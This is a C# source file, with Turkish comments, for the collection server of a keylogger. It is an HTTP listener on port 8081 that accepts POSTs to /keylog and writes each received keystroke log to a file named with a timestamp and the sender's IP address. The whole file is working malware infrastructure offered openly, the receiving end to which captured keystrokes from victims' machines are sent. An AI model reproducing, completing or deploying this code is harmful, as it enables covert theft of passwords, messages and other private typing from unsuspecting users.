using System;
using System.IO;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace Keylogger
{
    public class SimpleServer
    {
        private HttpListener listener;
        private bool isRunning = false;
        private string logDirectory;

        public SimpleServer(string prefix = "http://+:8081/")
        {
            listener = new HttpListener();
            listener.Prefixes.Add(prefix);
            logDirectory = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "ReceivedKeylogs");
            
            // Klasör yoksa oluştur
            if (!Directory.Exists(logDirectory))
            {
                Directory.CreateDirectory(logDirectory);
            }
        }

        public async Task StartAsync()
        {
            if (isRunning) return;

            try
            {
                listener.Start();
                isRunning = true;
                Console.WriteLine($"Sunucu başlatıldı. Loglar: {logDirectory}");

                while (isRunning)
                {
                    var context = await listener.GetContextAsync();
                    _ = Task.Run(() => ProcessRequest(context));
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Sunucu hatası: {ex.Message}");
            }
        }

        private async Task ProcessRequest(HttpListenerContext context)
        {
            try
            {
                var request = context.Request;
                var response = context.Response;

                if (request.HttpMethod == "POST" && request.Url.AbsolutePath == "/keylog")
                {
                    // Gelen veriyi oku
                    using (var reader = new StreamReader(request.InputStream, Encoding.UTF8))
                    {
                        string content = await reader.ReadToEndAsync();
                        
                        // Dosyaya kaydet
                        string fileName = $"keylog_{DateTime.Now:yyyyMMdd_HHmmss}_{request.RemoteEndPoint.Address}.txt";
                        string filePath = Path.Combine(logDirectory, fileName);
                        
                        await File.WriteAllTextAsync(filePath, content, Encoding.UTF8);
                        
                        Console.WriteLine($"Keylog alındı: {fileName}");
                        
                        // Başarılı yanıt gönder
                        string responseString = "Keylog başarıyla alındı";
                        byte[] buffer = Encoding.UTF8.GetBytes(responseString);
                        response.ContentLength64 = buffer.Length;
                        response.StatusCode = 200;
                        
                        await response.OutputStream.WriteAsync(buffer, 0, buffer.Length);
                    }
                }
                else
                {
                    // 404 yanıtı
                    response.StatusCode = 404;
                    string responseString = "Sayfa bulunamadı";
                    byte[] buffer = Encoding.UTF8.GetBytes(responseString);
                    response.ContentLength64 = buffer.Length;
                    await response.OutputStream.WriteAsync(buffer, 0, buffer.Length);
                }

                response.OutputStream.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"İstek işleme hatası: {ex.Message}");
            }
        }

        public void Stop()
        {
            isRunning = false;
            listener?.Stop();
            Console.WriteLine("Sunucu durduruldu.");
        }
    }
}